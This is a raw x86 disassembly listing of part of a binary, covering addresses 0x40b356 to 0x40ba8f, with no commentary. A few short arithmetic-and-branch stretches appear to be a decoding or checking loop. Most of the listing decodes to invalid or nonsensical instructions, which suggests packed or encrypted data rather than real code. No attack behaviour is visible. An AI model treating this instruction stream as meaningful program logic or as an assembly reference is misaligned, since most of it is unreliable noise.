  40b356:	adc    DWORD PTR [ebp+0x7b],ecx
  40b359:	into   
  40b35a:	les    ebx,FWORD PTR [eax-0x62]
  40b35d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b35e:	punpckhwd mm0,QWORD PTR [esi+0x3b]
  40b362:	fimul  DWORD PTR [edi]
  40b364:	xchg   DWORD PTR [eax],ecx
  40b366:	add    BYTE PTR [eax],al
  40b368:	add    BYTE PTR [ebx+0x36e9d055],cl
  40b36e:	pop    es
  40b36f:	add    BYTE PTR [eax],al
  40b371:	mov    edx,DWORD PTR [ebp-0x38]
  40b374:	mov    edi,DWORD PTR [ebp-0x4]
  40b377:	xor    edx,eax
  40b379:	xor    edi,eax
  40b37b:	add    edi,ecx
  40b37d:	add    edx,ecx
  40b37f:	imul   edx,edi
  40b382:	mov    edi,DWORD PTR [ebp-0x8]
  40b385:	mov    ebx,DWORD PTR [ebp-0x10]
  40b388:	sub    ebx,edi
  40b38a:	cmp    ebx,edx
  40b38c:	ja     0x40b39a
  40b392:	mov    edx,DWORD PTR [ebp-0x34]
  40b395:	jmp    0x40baa7
  40b39a:	mov    edx,DWORD PTR [ebp-0x3c]
  40b39d:	mov    edi,DWORD PTR [ebp-0x4]
  40b3a0:	jmp    0x40b713
  40b3a5:	ret    0x2e25
  40b3a8:	dec    ebx
  40b3a9:	icebp  
  40b3aa:	dec    ebx
  40b3ab:	ins    DWORD PTR es:[edi],dx
  40b3ac:	mov    ebp,0x68a70588
  40b3b1:	ret    0xcb9b
  40b3b4:	mov    ah,BYTE PTR [ecx-0x6]
  40b3b7:	jl     0x40b435
  40b3b9:	retf   0x7c79
  40b3bc:	jl     0x40b34c
  40b3be:	push   esp
  40b3bf:	push   0xd1d191c5
  40b3c4:	inc    ebx
  40b3c5:	inc    edx
  40b3c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3c7:	adc    ebp,DWORD PTR [eax]
  40b3c9:	stos   DWORD PTR es:[edi],eax
  40b3ca:	pop    ebx
  40b3cb:	inc    DWORD PTR [eax-0x7e]
  40b3ce:	mov    ecx,0x8a1b78ae
  40b3d3:	sbb    ch,BYTE PTR [eax]
  40b3d5:	cdq    
  40b3d6:	lock sbb al,0x12
  40b3d9:	xor    dl,BYTE PTR [esi]
  40b3db:	je     0x40b36e
  40b3dd:	ins    BYTE PTR es:[edi],dx
  40b3de:	adc    DWORD PTR [edx],edi
  40b3e0:	adc    ah,BYTE PTR [edi]
  40b3e2:	mov    ds:0xb00d66c1,eax
  40b3e7:	scas   al,BYTE PTR es:[edi]
  40b3e8:	in     eax,dx
  40b3e9:	jmp    0x5dbe:0xde660713
  40b3f0:	inc    ebp
  40b3f1:	xchg   BYTE PTR [edi+0x65181e77],bh
  40b3f7:	shl    eax,1
  40b3f9:	add    al,0xf6
  40b3fb:	mov    eax,ds:0xe5ad94d4
  40b400:	adc    esi,DWORD PTR ds:0x660803a3
  40b406:	stos   DWORD PTR es:[edi],eax
  40b407:	mov    dl,0xb0
  40b409:	mov    ch,0x36
  40b40b:	dec    esp
  40b40c:	(bad)  
  40b40d:	imul   edi,ebx,0xd769cd9e
  40b413:	(bad)  
  40b414:	call   0xdd434133
  40b419:	shld   DWORD PTR [edx-0x78],esi,0xcd
  40b41e:	daa    
  40b41f:	mov    DWORD PTR [edx-0x659dbff],esp
  40b425:	std    
  40b426:	into   
  40b427:	jp     0x40b3c7
  40b429:	dec    edi
  40b42a:	dec    edx
  40b42b:	ror    ebx,1
  40b42d:	dec    ebx
  40b42e:	mov    BYTE PTR [edi],dh
  40b430:	sub    eax,0x50d77881
  40b435:	stos   BYTE PTR es:[edi],al
  40b436:	or     al,0xc0
  40b438:	dec    ah
  40b43a:	push   cs
  40b43b:	sub    eax,0xa297ce3
  40b440:	or     al,BYTE PTR [ebx-0x6c]
  40b443:	cmp    dh,BYTE PTR [ebx-0x1b]
  40b446:	out    dx,eax
  40b447:	xlat   BYTE PTR ds:[ebx]
  40b448:	jmp    0x4d8d94fd
  40b44d:	or     eax,0x32c00bcb
  40b452:	xchg   edi,eax
  40b453:	aam    0x3b
  40b455:	sbb    dh,bh
  40b457:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b458:	cmp    esp,DWORD PTR [esi]
  40b45a:	or     ebx,DWORD PTR [ecx+0x64]
  40b45d:	xor    ch,BYTE PTR [ebx+0x1eed0337]
  40b463:	xor    bh,BYTE PTR [ebx+0x18]
  40b466:	sbb    dl,dh
  40b468:	pop    eax
  40b469:	in     eax,dx
  40b46a:	cld    
  40b46b:	mov    ebx,0x6bb6bc51
  40b470:	mov    edi,0x60ed8951
  40b475:	xor    al,0x4
  40b477:	sub    eax,0x2e67c35f
  40b47c:	fbld   TBYTE PTR [eax+0x45]
  40b47f:	sbb    al,0xf0
  40b481:	call   0x6b097e31
  40b486:	mov    ecx,0x747a0ef6
  40b48b:	repnz lds ebp,FWORD PTR [edi]
  40b48e:	sbb    eax,0x2d950ff2
  40b493:	pop    ebx
  40b494:	adc    esp,edi
  40b496:	mov    al,ds:0x5c20e26c
  40b49b:	ins    BYTE PTR es:[edi],dx
  40b49c:	xor    esi,DWORD PTR [ebp+0x68eef3c]
  40b4a2:	rol    bl,1
  40b4a4:	pop    ds
  40b4a5:	out    dx,al
  40b4a6:	jmp    0x9bcb:0x48001fff
  40b4ad:	jmp    0x40b45b
  40b4af:	in     eax,0x32
  40b4b1:	xchg   DWORD PTR [eax],esp
  40b4b3:	leave  
  40b4b4:	sbb    dh,BYTE PTR ds:0xba3d355b
  40b4ba:	shr    DWORD PTR [esi-0x27],1
  40b4bd:	lods   eax,DWORD PTR ds:[esi]
  40b4be:	test   al,0xe1
  40b4c0:	mov    si,0xca59
  40b4c4:	pop    edi
  40b4c5:	and    ebp,0x2deeff2d
  40b4cb:	mov    edi,0xc2ec177e
  40b4d0:	jmp    0xc53a10e0
  40b4d5:	aas    
  40b4d6:	push   cs
  40b4d7:	dec    esp
  40b4d8:	aam    0x1d
  40b4da:	cmp    BYTE PTR [eax],bh
  40b4dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4dd:	mov    al,0x37
  40b4df:	pusha  
  40b4e0:	mov    esi,0x829ef680
  40b4e5:	in     al,0xcf
  40b4e7:	lods   eax,DWORD PTR ds:[esi]
  40b4e8:	jmp    FWORD PTR [ebx+0x56]
  40b4eb:	cmp    al,0xb4
  40b4ed:	mov    ebp,0xa8473527
  40b4f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4f3:	rol    eax,cl
  40b4f5:	add    eax,0x5c279fad
  40b4fa:	add    DWORD PTR [eax],ecx
  40b4fc:	inc    eax
  40b4fd:	mov    ch,0x74
  40b4ff:	aam    0x1b
  40b501:	sbb    al,0x84
  40b503:	ss or  eax,0x96b60429
  40b509:	xchg   esp,eax
  40b50a:	jge    0x40b4ac
  40b50c:	push   ebx
  40b50d:	xor    al,0xc
  40b50f:	inc    edx
  40b510:	shr    BYTE PTR [edi+0x71],cl
  40b513:	adc    dh,dl
  40b515:	hlt    
  40b516:	inc    ecx
  40b517:	(bad)  
  40b518:	fld    QWORD PTR [ebx+0x66]
  40b51b:	xchg   DWORD PTR [ebx],ecx
  40b51d:	jnp    0x40b509
  40b51f:	adc    al,0x9
  40b521:	out    0x2c,al
  40b523:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b524:	frstor [esi-0x41843079]
  40b52a:	jnp    0x40b56d
  40b52c:	fstp   QWORD PTR [edx]
  40b52e:	(bad)  
  40b52f:	jg     0x40b586
  40b531:	in     eax,dx
  40b532:	pop    esp
  40b533:	jl     0x40b54c
  40b535:	xlat   BYTE PTR ds:[ebx]
  40b536:	add    bh,bh
  40b538:	push   es
  40b539:	std    
  40b53a:	xor    al,0x45
  40b53c:	daa    
  40b53d:	scas   eax,DWORD PTR es:[edi]
  40b53e:	les    ebp,FWORD PTR [ecx]
  40b540:	mov    BYTE PTR [esi-0x75fa15cb],dl
  40b546:	lods   eax,DWORD PTR ds:[esi]
  40b547:	cmp    BYTE PTR [esi+0x5],0x8
  40b54b:	fucomi st,st(1)
  40b54d:	(bad)  
  40b54e:	inc    edx
  40b54f:	pop    ds
  40b550:	xor    BYTE PTR [ecx],bl
  40b552:	pop    eax
  40b553:	sbb    DWORD PTR [esi],ebx
  40b555:	test   DWORD PTR [esi-0x6d1de3b6],ebp
  40b55b:	fstp   DWORD PTR [eax-0x64c8e24f]
  40b561:	sub    eax,0x90a2dc6f
  40b566:	stos   BYTE PTR es:[edi],al
  40b567:	cmp    eax,DWORD PTR [eax+0x796dd874]
  40b56d:	loop   0x40b52a
  40b56f:	aam    0xda
  40b571:	push   cs
  40b572:	(bad)  
  40b573:	std    
  40b574:	dec    eax
  40b575:	push   0x7f
  40b577:	shl    BYTE PTR [esi],0x21
  40b57a:	sub    BYTE PTR [edx+0x7a],dh
  40b57d:	lods   eax,DWORD PTR ds:[esi]
  40b57e:	xor    edi,ebp
  40b580:	icebp  
  40b581:	dec    edi
  40b582:	retf   0x6a12
  40b585:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b586:	xor    ah,BYTE PTR [ebx+eax*8]
  40b589:	(bad)  
  40b58a:	mov    al,ds:0x1845f5ba
  40b58f:	ret    
  40b590:	and    edx,0x63f02a6c
  40b596:	mov    al,0x44
  40b598:	mov    ?,ebp
  40b59a:	jae    0x40b5cd
  40b59c:	(bad)  
  40b59d:	pop    esp
  40b59e:	das    
  40b59f:	jecxz  0x40b587
  40b5a1:	push   eax
  40b5a2:	adc    bh,dh
  40b5a4:	mov    esp,0xd586f42e
  40b5a9:	leave  
  40b5aa:	xchg   ebp,eax
  40b5ab:	mov    eax,0x53dd7b6e
  40b5b0:	jne    0x40b5e0
  40b5b2:	cwde   
  40b5b3:	neg    cl
  40b5b5:	ret    
  40b5b6:	jg     0x40b5b1
  40b5b8:	xchg   DWORD PTR [edx],edx
  40b5ba:	nop
  40b5bb:	jb     0x40b630
  40b5bd:	(bad)  
  40b5be:	jnp    0x40b56f
  40b5c0:	sbb    al,0x77
  40b5c2:	dec    esp
  40b5c3:	adc    eax,0x5882f4e2
  40b5c8:	dec    edi
  40b5c9:	std    
  40b5ca:	mov    ebx,0x72b2c41c
  40b5cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5d0:	cmp    edi,DWORD PTR [ebx+0x33]
  40b5d3:	mov    dl,0xe2
  40b5d5:	jno    0x40b584
  40b5d7:	js     0x40b638
  40b5d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5da:	xor    edx,edx
  40b5dc:	jp     0x40b5c8
  40b5de:	enter  0xd954,0xb4
  40b5e2:	pop    ebx
  40b5e3:	leave  
  40b5e4:	push   ds
  40b5e5:	dec    ebp
  40b5e6:	getsec 
  40b5e8:	inc    edx
  40b5e9:	dec    esi
  40b5ea:	outs   dx,BYTE PTR ds:[esi]
  40b5eb:	jge    0x40b616
  40b5ed:	test   DWORD PTR [esp+eiz*2-0x6a],edi
  40b5f1:	outs   dx,DWORD PTR ds:[esi]
  40b5f2:	mov    dh,0xcc
  40b5f4:	enter  0xc5f0,0x45
  40b5f8:	scas   eax,DWORD PTR es:[edi]
  40b5f9:	imul   edx,DWORD PTR [edi-0x379369e3],0xffffff89
  40b600:	in     al,dx
  40b601:	push   ebx
  40b602:	fnsave [ecx]
  40b604:	test   eax,0x672aa92
  40b609:	out    dx,eax
  40b60a:	sub    esp,edx
  40b60c:	daa    
  40b60d:	adc    BYTE PTR [ebx-0x42bb6622],ah
  40b613:	or     al,0x55
  40b615:	adc    ch,dl
  40b617:	cld    
  40b618:	fisub  WORD PTR [edx-0x62]
  40b61b:	jg     0x40b5c0
  40b61d:	mov    dl,0xcb
  40b61f:	or     al,0xe8
  40b621:	add    BYTE PTR [esi-0x4],bl
  40b624:	adc    edx,ebx
  40b626:	and    eax,0xbd30022
  40b62b:	cs sub al,0x4e
  40b62e:	repz mov esi,0xb7ee9642
  40b634:	add    edx,DWORD PTR [edx+esi*8]
  40b637:	jb     0x40b6a9
  40b639:	jecxz  0x40b679
  40b63b:	or     ebx,DWORD PTR [ebx-0x19]
  40b63e:	clc    
  40b63f:	ret    
  40b640:	cmp    BYTE PTR [ebp-0x4e],ah
  40b643:	out    dx,eax
  40b644:	sub    DWORD PTR [ebp+edx*1-0x13],ebx
  40b648:	ins    DWORD PTR es:[edi],dx
  40b649:	mov    al,ds:0xe2799c59
  40b64e:	es mov al,0x18
  40b651:	push   eax
  40b652:	cmp    eax,0x2eeaa84
  40b657:	inc    esi
  40b658:	jmp    0x40b6bf
  40b65a:	mov    al,0x82
  40b65c:	sub    esp,eax
  40b65e:	mov    ah,0x4b
  40b660:	loopne 0x40b679
  40b662:	xchg   BYTE PTR [edi],dl
  40b664:	scas   eax,DWORD PTR es:[edi]
  40b665:	js     0x40b6b2
  40b667:	adc    BYTE PTR [ebx],bl
  40b669:	xchg   ebx,eax
  40b66a:	jnp    0x40b61c
  40b66c:	xchg   esp,eax
  40b66d:	out    dx,eax
  40b66e:	push   ds
  40b66f:	dec    edi
  40b670:	pop    edi
  40b671:	jp     0x40b63d
  40b673:	aas    
  40b674:	mov    edi,DWORD PTR [eax]
  40b676:	test   BYTE PTR [edi],0xe9
  40b679:	test   BYTE PTR [edx-0x6],bl
  40b67c:	jnp    0x40b6de
  40b67e:	fwait
  40b67f:	jl     0x40b633
  40b681:	or     cl,bh
  40b683:	push   0xffffff98
  40b685:	add    al,0x3a
  40b687:	stos   DWORD PTR es:[edi],eax
  40b688:	and    al,BYTE PTR [ebp-0x3e1ee400]
  40b68e:	add    ebp,ebp
  40b690:	test   DWORD PTR [ebp+ecx*4+0x68],edx
  40b694:	std    
  40b695:	jno    0x40b6c6
  40b697:	pop    ds
  40b698:	lods   al,BYTE PTR ds:[esi]
  40b699:	cmc    
  40b69a:	stc    
  40b69b:	leave  
  40b69c:	call   0xcbe8:0xd66b18d6
  40b6a3:	popa   
  40b6a4:	push   eax
  40b6a5:	and    bl,bl
  40b6a7:	mov    eax,0xb9f826c1
  40b6ac:	and    BYTE PTR [esi-0x59],cl
  40b6af:	mul    BYTE PTR [esi-0x9]
  40b6b2:	fsub   DWORD PTR [ecx-0x22]
  40b6b5:	jo     0x40b6df
  40b6b7:	frstor [eax-0x1995f4f9]
  40b6bd:	xor    eax,esi
  40b6bf:	sar    DWORD PTR [edi],1
  40b6c1:	inc    ebp
  40b6c2:	rcl    dl,1
  40b6c4:	pop    esp
  40b6c5:	pop    ecx
  40b6c6:	daa    
  40b6c7:	(bad)  
  40b6c8:	in     al,dx
  40b6c9:	loope  0x40b654
  40b6cb:	add    BYTE PTR [ecx+ebp*4-0x4f],al
  40b6cf:	adc    DWORD PTR [esi],eax
  40b6d1:	dec    ebx
  40b6d2:	(bad)  
  40b6d4:	mov    eax,ds:0x61ca350f
  40b6d9:	ja     0x40b759
  40b6db:	mov    esp,0xd1ae32
  40b6e0:	jg     0x40b6e2
  40b6e2:	xchg   edi,eax
  40b6e3:	repz cmp eax,0xd64408d0
  40b6e9:	push   edx
  40b6ea:	in     al,0xa2
  40b6ec:	daa    
  40b6ed:	jne    0x40b729
  40b6ef:	pop    ebx
  40b6f0:	callw  0x188a
  40b6f4:	out    dx,eax
  40b6f5:	pop    ds
  40b6f6:	inc    ecx
  40b6f7:	pop    ebp
  40b6f8:	jbe    0x40b6df
  40b6fa:	or     al,ch
  40b6fc:	mov    esi,0x6646c599
  40b701:	cmp    DWORD PTR [esi+0x2be6c92],esp
  40b707:	and    DWORD PTR [edx],ecx
  40b709:	inc    edx
  40b70a:	dec    edi
  40b70b:	imul   esp,edi,0x3c
  40b70e:	jmp    0x40b71a
  40b710:	sub    esp,DWORD PTR [ebp-0xf]
  40b713:	xor    edx,eax
  40b715:	xor    edi,eax
  40b717:	add    edx,ecx
  40b719:	add    edi,ecx
  40b71b:	imul   edx,edi
  40b71e:	mov    edi,DWORD PTR [ebp-0x8]
  40b721:	mov    ebx,DWORD PTR [ebp-0x10]
  40b724:	sub    ebx,edi
  40b726:	cmp    ebx,edx
  40b728:	mov    edx,DWORD PTR [ebp-0x38]
  40b72b:	jbe    0x40baa7
  40b731:	jmp    0x40baa4
  40b736:	dec    ecx
  40b737:	mov    cl,0xec
  40b739:	cwde   
  40b73a:	hlt    
  40b73b:	ins    DWORD PTR es:[edi],dx
  40b73c:	push   ebp
  40b73d:	jge    0x40b6d6
  40b73f:	loop   0x40b70e
  40b741:	loope  0x40b716
  40b743:	pop    ebx
  40b744:	int    0x78
  40b746:	aas    
  40b747:	xchg   BYTE PTR [esp+edi*2-0x36],bh
  40b74b:	jns    0x40b7c9
  40b74d:	jl     0x40b709
  40b74f:	lods   al,BYTE PTR ds:[esi]
  40b750:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b751:	push   es
  40b752:	sub    ecx,DWORD PTR [ebp+0x6c0173ea]
  40b758:	adc    ah,BYTE PTR [eax-0x402af6d8]
  40b75e:	fcomp  DWORD PTR [edx+0x7]
  40b761:	test   DWORD PTR cs:[ebp+ebx*1-0x5a],ebp
  40b766:	push   esi
  40b767:	push   0xc58b3238
  40b76c:	dec    ecx
  40b76d:	xchg   ebx,eax
  40b76e:	mov    al,0x14
  40b770:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b771:	pop    ebp
  40b772:	mov    DWORD PTR [esi+0x4e779e46],0x48cb2409
  40b77c:	lahf   
  40b77d:	fwait
  40b77e:	imul   ebp,ebp,0xa229c532
  40b784:	push   ss
  40b785:	inc    ecx
  40b786:	fwait
  40b787:	mov    cl,0x0
  40b789:	ss out 0x37,eax
  40b78c:	pop    ss
  40b78d:	xor    ebx,ebx
  40b78f:	data16 (bad) 
  40b791:	push   ds
  40b792:	popf   
  40b793:	push   esp
  40b794:	je     0x40b750
  40b796:	inc    ebx
  40b797:	mov    cl,BYTE PTR [eax+0x50895a5f]
  40b79d:	or     al,0xf3
  40b79f:	jno    0x40b7ed
  40b7a1:	push   eax
  40b7a2:	dec    ebp
  40b7a3:	inc    edi
  40b7a4:	cs sti 
  40b7a6:	stos   BYTE PTR es:[edi],al
  40b7a7:	adc    BYTE PTR [edi-0x7b],ah
  40b7aa:	out    0x68,al
  40b7ac:	out    dx,eax
  40b7ad:	hlt    
  40b7ae:	mov    esi,0xfad5fa0
  40b7b3:	mov    edx,0xad79f81d
  40b7b8:	push   ss
  40b7b9:	(bad)  
  40b7ba:	dec    DWORD PTR [eax+ecx*8+0x78]
  40b7be:	sub    eax,0xdb7dd1bd
  40b7c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7c4:	mov    edx,0xd5cde3d
  40b7c9:	xchg   ecx,eax
  40b7ca:	jbe    0x40b83b
  40b7cc:	adc    ebx,DWORD PTR [ebp+eiz*1+0x4c]
  40b7d0:	cwde   
  40b7d1:	jge    0x40b82f
  40b7d3:	and    esi,DWORD PTR [esp+ebp*2]
  40b7d6:	inc    ebx
  40b7d7:	mov    esi,DWORD PTR [ecx-0x4d]
  40b7da:	ficom  WORD PTR [esi-0x5f031096]
  40b7e0:	std    
  40b7e1:	pushf  
  40b7e2:	push   0xffffff8a
  40b7e4:	imul   eax,DWORD PTR [ebx],0x5bd2014b
  40b7ea:	repz std 
  40b7ec:	mov    ch,0x7e
  40b7ee:	xchg   edi,esi
  40b7f0:	add    eax,0x6ecffed7
  40b7f5:	or     dh,BYTE PTR [edx+0x30ee22e0]
  40b7fb:	hlt    
  40b7fc:	jl     0x40b7ef
  40b7fe:	and    ecx,DWORD PTR [esi+ebx*4]
  40b801:	call   0xe586:0xec8ebee1
  40b808:	mov    eax,eax
  40b80a:	fisub  DWORD PTR [ebx+0xc]
  40b80d:	inc    BYTE PTR [eax+ebx*8]
  40b810:	pop    ecx
  40b811:	jo     0x40b7f6
  40b813:	push   ss
  40b814:	fwait
  40b815:	into   
  40b816:	and    dh,BYTE PTR [ecx+0x3531687c]
  40b81c:	xchg   esp,eax
  40b81d:	jo     0x40b7d2
  40b81f:	ins    BYTE PTR es:[edi],dx
  40b820:	jle    0x40b7a9
  40b822:	jns    0x40b833
  40b824:	adc    edi,DWORD PTR [esi-0x75]
  40b827:	xor    al,0xc
  40b829:	xor    al,0x2e
  40b82b:	lods   eax,DWORD PTR ds:[esi]
  40b82c:	sahf   
  40b82d:	dec    esp
  40b82e:	(bad)  
  40b82f:	fbld   TBYTE PTR [ebx]
  40b831:	outs   dx,BYTE PTR ds:[esi]
  40b832:	imul   ebp,DWORD PTR [esi-0x2e203764],0x35978947
  40b83c:	mov    dh,0x50
  40b83e:	mov    eax,ds:0xa833e8f0
  40b843:	adc    al,0x44
  40b845:	fnsave [ebx-0x7]
  40b848:	lds    ecx,FWORD PTR [edi+0x731a237a]
  40b84e:	lods   al,BYTE PTR ds:[esi]
  40b84f:	inc    dh
  40b851:	dec    esi
  40b852:	mov    cl,0xe9
  40b854:	(bad)  
  40b855:	push   ecx
  40b856:	pop    esp
  40b857:	sar    BYTE PTR [edx],0x60
  40b85a:	cdq    
  40b85b:	mov    ecx,0xbe8f3414
  40b860:	sar    ecx,1
  40b862:	sbb    esi,DWORD PTR [ebx-0x58f25129]
  40b868:	push   eax
  40b869:	mov    bh,0xd8
  40b86b:	sub    ch,al
  40b86d:	mov    dh,0x1a
  40b86f:	mov    edx,0x1b4553e9
  40b874:	pop    ss
  40b875:	out    dx,eax
  40b876:	xchg   ecx,eax
  40b877:	ja     0x40b808
  40b879:	jecxz  0x40b8d3
  40b87b:	pop    es
  40b87c:	(bad)  
  40b87d:	rol    DWORD PTR [ecx+0x404482cf],cl
  40b883:	ror    DWORD PTR [esi],0x42
  40b886:	sub    eax,0x29e4e975
  40b88b:	popf   
  40b88c:	(bad)  
  40b88d:	and    al,0x78
  40b88f:	imul   esi,DWORD PTR [edx+0x5ce91567],0xffffffff
  40b896:	stc    
  40b897:	pop    ds
  40b898:	mov    bh,0xb0
  40b89a:	sub    edx,DWORD PTR [ebx+esi*8+0x6c]
  40b89e:	test   DWORD PTR [ebp+edi*1-0x7a],esi
  40b8a2:	rcl    DWORD PTR ds:0x87948634,1
  40b8a8:	les    edi,FWORD PTR [edx]
  40b8aa:	test   DWORD PTR [ebx+0x2d27fa96],0x28538ba9
  40b8b4:	mov    ecx,ebp
  40b8b6:	and    al,0x4c
  40b8b8:	inc    edi
  40b8b9:	pop    esp
  40b8ba:	sbb    esp,ebp
  40b8bc:	test   eax,0xb04042c
  40b8c1:	jne    0x40b846
  40b8c3:	ret    
  40b8c4:	jle    0x40b93d
  40b8c6:	call   0x3f40:0xdccd1639
  40b8cd:	mov    ch,0x2a
  40b8cf:	xor    ecx,DWORD PTR [ecx-0x8]
  40b8d2:	call   0x3349:0xfe77b01e
  40b8d9:	retf   0xcaaa
  40b8dc:	mov    edx,0x3330eac6
  40b8e1:	aas    
  40b8e2:	mov    ecx,0x198c23e3
  40b8e7:	and    bh,bl
  40b8e9:	popa   
  40b8ea:	adc    al,0x6c
  40b8ec:	mov    dl,0x75
  40b8ee:	icebp  
  40b8ef:	pop    ebp
  40b8f0:	fldenv [esi+0x5a]
  40b8f3:	adc    BYTE PTR ds:[edx+0x63],0xef
  40b8f8:	stos   DWORD PTR es:[edi],eax
  40b8f9:	mov    cl,0x70
  40b8fb:	sub    al,0x95
  40b8fd:	ret    0xd062
  40b900:	into   
  40b901:	xchg   edx,eax
  40b902:	pop    es
  40b903:	fisub  DWORD PTR [eax+0x11]
  40b906:	pop    edi
  40b907:	or     eax,0xc8bdd324
  40b90c:	mov    ecx,DWORD PTR [ebp+0x1e]
  40b90f:	xor    edx,edx
  40b911:	test   al,0x76
  40b913:	adc    al,0x5f
  40b915:	daa    
  40b916:	mov    gs,WORD PTR [edx+0x4550826e]
  40b91c:	loop   0x40b96e
  40b91e:	sub    al,0xd8
  40b920:	fdivr  QWORD PTR [ebx]
  40b922:	add    al,0x44
  40b924:	loopne 0x40b8aa
  40b926:	ja     0x40b90c
  40b928:	xchg   ebp,eax
  40b929:	or     bl,BYTE PTR [ebx+edi*8-0x4a347955]
  40b930:	fisub  WORD PTR [ebp-0x71]
  40b933:	fistp  WORD PTR [ebp+edi*1-0x2022ef5c]
  40b93a:	jg     0x40b8c1
  40b93c:	in     eax,dx
  40b93d:	or     al,0x63
  40b93f:	jns    0x40b951
  40b941:	sbb    DWORD PTR [edx],edi
  40b943:	xchg   esi,eax
  40b944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b945:	loope  0x40b998
  40b947:	adc    DWORD PTR [ecx],esp
  40b949:	ss (bad) 
  40b94b:	pop    edi
  40b94c:	cmp    DWORD PTR [esi+0x5d063a89],0xe7124556
  40b956:	inc    edx
  40b957:	mov    esi,DWORD PTR ds:0x152225aa
  40b95d:	mov    eax,ds:0xb70c766b
  40b962:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b963:	add    BYTE PTR [eax+0x296a154d],dh
  40b969:	cdq    
  40b96a:	adc    eax,DWORD PTR [esi]
  40b96c:	add    edx,DWORD PTR [ebp+ebp*1+0x5702cd78]
  40b973:	jno    0x40b942
  40b975:	mov    ah,BYTE PTR [esi+0x1d]
  40b978:	dec    edi
  40b979:	pop    esi
  40b97a:	pushf  
  40b97b:	jecxz  0x40b91f
  40b97d:	mov    edi,edi
  40b97f:	add    al,BYTE PTR [ebp-0x42]
  40b982:	jno    0x40b949
  40b984:	(bad)  
  40b987:	push   ss
  40b988:	(bad)  
  40b989:	(bad)  [edi-0x4e31169f]
  40b98f:	and    eax,0x5bce5766
  40b994:	adc    al,0x4a
  40b997:	push   cs
  40b998:	pop    esi
  40b999:	iret   
  40b99a:	inc    esi
  40b99b:	xor    eax,ecx
  40b99d:	sbb    esi,ebp
  40b99f:	mov    WORD PTR [eax+0xf676802],es
  40b9a5:	cld    
  40b9a6:	int    0xe8
  40b9a8:	and    DWORD PTR [ecx],ecx
  40b9aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9ab:	mov    bl,0x52
  40b9ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9ae:	and    al,0xb0
  40b9b0:	(bad)  
  40b9b1:	sbb    bl,bh
  40b9b3:	jmp    0x40b9e2
  40b9b5:	jne    0x40b9fc
  40b9b7:	and    BYTE PTR [esi+0x29bc0c85],dl
  40b9bd:	sbb    ah,ch
  40b9bf:	fldenv [ecx+0x1b45342e]
  40b9c5:	or     al,BYTE PTR [ebx+0x7718f9ab]
  40b9cb:	scas   al,BYTE PTR es:[edi]
  40b9cc:	xchg   ebx,eax
  40b9cd:	(bad)  
  40b9cf:	dec    esp
  40b9d0:	fwait
  40b9d1:	xchg   ebx,eax
  40b9d2:	cmp    edi,DWORD PTR [ecx+0x4a]
  40b9d5:	mov    eax,0x95136874
  40b9da:	xchg   edx,eax
  40b9db:	test   al,0x6c
  40b9dd:	pop    eax
  40b9de:	ja     0x40ba09
  40b9e0:	pop    esi
  40b9e1:	and    BYTE PTR [edi-0x7c],bl
  40b9e4:	stc    
  40b9e5:	cld    
  40b9e6:	test   eax,0x13ffb954
  40b9eb:	dec    eax
  40b9ec:	lahf   
  40b9ed:	dec    edi
  40b9ee:	les    edx,FWORD PTR [edi*1-0x52642efb]
  40b9f5:	test   al,0x69
  40b9f7:	addr16 mov eax,0x2c356fa7
  40b9fd:	out    0xa3,al
  40b9ff:	jbe    0x40b9b1
  40ba01:	sbb    DWORD PTR [eax+0x62],edx
  40ba04:	push   eax
  40ba05:	mov    eax,edi
  40ba07:	ret    0xea63
  40ba0a:	push   edx
  40ba0b:	neg    DWORD PTR [ecx+esi*4]
  40ba0e:	(bad)  
  40ba0f:	jle    0x40b9b5
  40ba11:	jo     0x40b9b8
  40ba13:	inc    ebp
  40ba14:	popf   
  40ba15:	cdq    
  40ba16:	add    eax,0xeed4aa9e
  40ba1b:	mov    cl,0xbd
  40ba1d:	mov    cl,0xc0
  40ba1f:	les    edx,FWORD PTR [ebx-0x3f]
  40ba22:	(bad)  [edi-0x438e6ccc]
  40ba28:	push   ebx
  40ba29:	and    BYTE PTR [esi+0xdc52243],bl
  40ba2f:	xor    DWORD PTR [ebp+0x62],edi
  40ba32:	outs   dx,BYTE PTR ds:[esi]
  40ba33:	dec    eax
  40ba34:	call   0x9281:0xdf60b690
  40ba3b:	fs push di
  40ba3e:	jl     0x40baae
  40ba40:	cdq    
  40ba41:	mov    ebp,0x8eff0574
  40ba46:	add    DWORD PTR [ecx],esi
  40ba48:	mov    ebx,0x14cadcb2
  40ba4d:	cli    
  40ba4e:	mov    dh,0xcf
  40ba50:	fwait
  40ba51:	adc    dh,BYTE PTR [esi]
  40ba53:	mov    esi,0x12c1ec53
  40ba58:	or     DWORD PTR [ebp-0x80],esp
  40ba5b:	out    0x13,eax
  40ba5d:	xchg   ebp,eax
  40ba5e:	dec    ebx
  40ba5f:	(bad)  
  40ba60:	pop    esi
  40ba61:	xor    ebx,esp
  40ba63:	loope  0x40b9f7
  40ba65:	sub    eax,0x514f3ca7
  40ba6a:	adc    al,0x8c
  40ba6c:	add    ah,cl
  40ba6e:	addr16 aad 0xad
  40ba71:	add    eax,0xcd6c4f63
  40ba76:	jmp    0x40ba71
  40ba78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba79:	call   0xd8eb:0x449edbc4
  40ba80:	mov    ds:0x6024a96,eax
  40ba85:	popf   
  40ba86:	mov    esp,0x2ebddd9d
  40ba8b:	aad    0x5
  40ba8d:	stc    
  40ba8e:	push   es
  40ba8f:	mov    dh,0x8f
